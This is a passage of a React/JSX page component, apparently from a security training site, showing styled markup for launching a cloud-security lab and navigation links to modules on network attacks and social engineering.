          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 145 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#ff9500', padding: '12px 32px', border: '1px solid rgba(255,149,0,0.6)', borderRadius: '6px', background: 'rgba(255,149,0,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,149,0,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/network-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-08: NETWORK ATTACKS</Link>
          <Link href="/modules/social-engineering" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-10: SOCIAL ENGINEERING &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
